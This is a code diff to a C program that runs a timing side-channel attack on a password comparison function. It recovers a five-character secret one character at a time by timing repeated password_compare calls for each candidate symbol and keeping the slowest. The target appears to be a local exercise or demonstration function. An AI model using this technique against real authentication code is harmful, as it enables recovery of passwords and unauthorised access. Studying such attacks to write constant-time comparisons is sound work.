@@ -7,11 +7,7 @@
 #include "timing.h"
 
 #define MAXLEN 20
-
-struct Index2d {
-    size_t x;
-    size_t y;
-};
+#define LENGTH 5
 
 const char * symbols = "abcdefghijklmnopqrstuvwxyz"
                        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -21,55 +17,50 @@ const char * symbols = "abcdefghijklmnopqrstuvwxyz"
                        "€´ ";
 
 int main(void) {
-    size_t len = strlen(symbols);
-    clock_t ** times = (clock_t **) calloc(len, sizeof(clock_t *));
-    for (uint32_t i = 0; i < len; i++) {
-        times[i] = (clock_t *) calloc(MAXLEN, sizeof(clock_t));
-    }
+    const size_t len = strlen(symbols);
+    clock_t * times = (clock_t *) calloc(len, sizeof(clock_t));
 
     clock_t start, stop;
+    char secret[LENGTH] = {'a'};
 
-    for (uint32_t k = 0; k < len; k++) {
-        for (uint32_t i = 0; i < MAXLEN; i++) {
-            char str[i + 1];
-            for (uint32_t j = 0; j < i + 1; j++) {
-                str[j] = symbols[k];
-            }
+    int res = 0;
+
+    for (uint32_t i = 0; i < LENGTH; i++) {
+        for (uint64_t j = 0; j < len; j++) {
+            secret[i] = symbols[j];
+
             start = clock();
-            for (uint64_t j = 0; j < 100000000; j++) {
-                password_compare(str);
+            for (uint64_t k = 0; k < 10000000; k++) {
+                res = password_compare(secret);
             }
             stop = clock();
-
-            times[k][i] =  stop - start;
-            assert(stop - start > 0);
+            times[j] = stop - start;
+            if (res != 255) {
+                printf("compare fct returned != 255; pw might be: %s\n", secret);
+            }
         }
+        
+        secret[i] = symbols[time_max(times, len)];
     }
 
-    Index2d * max = (Index2d *) calloc(1, sizeof(Index2d));
-    time_max(times, len, max);
-    printf("length: %lu\n", max->y + 1);
-    printf("first char: %c\n", symbols[max->x]);
+    printf("timing attack says: %s\n", secret);
+    printf("password_compare says: %d\n", password_compare(secret));
 
-    free(max);
-    for (uint32_t i = 0; i < len; i++) {
-        free(times[i]);
-    }
     free(times);
 
     return EXIT_SUCCESS;
 }
 
-void time_max(clock_t ** arr, size_t len, Index2d * res) {
+/* return the index holding the highest element */
+size_t time_max(clock_t * arr, size_t len) {
     clock_t max = 0;
+    size_t res = 0;
 
     for (size_t i = 0; i < len; i++) {
-        for (uint32_t j = 0; j < MAXLEN; j++) {
-            if (arr[i][j] > max) {
-                max = arr[i][j];
-                res->x = i;
-                res->y = j;
-            }
+        if (arr[i] > max) {
+            max = arr[i];
+            res = i;
         }
     }
+    return res;
 }
